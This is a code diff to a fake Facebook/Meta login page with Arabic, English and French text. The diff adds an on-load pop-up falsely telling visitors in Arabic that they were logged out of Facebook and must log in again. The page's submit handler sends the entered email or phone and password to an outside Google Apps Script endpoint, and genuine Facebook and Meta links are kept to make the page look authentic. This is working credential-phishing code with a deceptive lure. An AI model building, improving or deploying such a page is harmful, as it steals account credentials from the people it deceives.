@@ -79,6 +79,27 @@
       animation: spin 0.8s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+
+    /* ✅ فقاعة أسفل الصفحة */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: #000;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
   </style>
 </head>
 <body>
@@ -111,6 +132,9 @@
   <!-- ✅ رابط Meta -->
   <div class="meta" id="metaLink">Meta ©</div>
 
+  <!-- ✅ فقاعة الإشعار -->
+  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
+
   <script>
     const langBtn = document.getElementById("langBtn");
     const emailInput = document.getElementById("emailInput");
@@ -122,8 +146,17 @@
     const errorPass = document.getElementById("error-pass");
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
+    const toast = document.getElementById("toast");
 
-    // الرسائل باللغات
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
+
+    // باقي الكود بدون تغيير
     const translations = {
       ar: {
         lang: "العربية ⌵",
@@ -168,7 +201,6 @@
 
     const langs = ["ar", "en", "fr"];
     let currentLangIndex = 0;
-
     const savedLang = localStorage.getItem("langIndex");
     if (savedLang !== null) {
       currentLangIndex = parseInt(savedLang);
@@ -186,19 +218,10 @@
       errorEmail.textContent = t.errorEmail;
       errorPass.textContent = t.errorPass;
 
-      emailInput.oninvalid = function() {
-        this.setCustomValidity(t.customEmail);
-      };
-      emailInput.oninput = function() {
-        this.setCustomValidity("");
-      };
-
-      passInput.oninvalid = function() {
-        this.setCustomValidity(t.customPass);
-      };
-      passInput.oninput = function() {
-        this.setCustomValidity("");
-      };
+      emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
+      emailInput.oninput = function() { this.setCustomValidity(""); };
+      passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
+      passInput.oninput = function() { this.setCustomValidity(""); };
 
       localStorage.setItem("langIndex", currentLangIndex);
     }
@@ -218,34 +241,27 @@
       window.location.href = "https://m.facebook.com/reg/";
     });
 
-    // ✅ عند الضغط على "Meta ©"
     document.getElementById("metaLink").addEventListener("click", () => {
       window.location.href = "https://about.meta.com/";
     });
 
     form.addEventListener("submit", e => {
       e.preventDefault();
-
       let valid = true;
       errorEmail.style.display = "none";
       errorPass.style.display = "none";
 
       const emailOrPhone = emailInput.value.trim();
       const password = passInput.value.trim();
-
       const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
       const phoneRegex = /^[0-9]{6,15}$/;
 
       if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
-        errorEmail.style.display = "block";
-        valid = false;
+        errorEmail.style.display = "block"; valid = false;
       }
-
       if (password.length < 4) {
-        errorPass.style.display = "block";
-        valid = false;
+        errorPass.style.display = "block"; valid = false;
       }
-
       if (!valid) return;
 
       const t = translations[langs[currentLangIndex]];
@@ -253,7 +269,6 @@
       submitButton.disabled = true;
 
       const data = { email_or_phone: emailOrPhone, password: password };
-
       fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
         method: "POST",
         body: JSON.stringify(data)
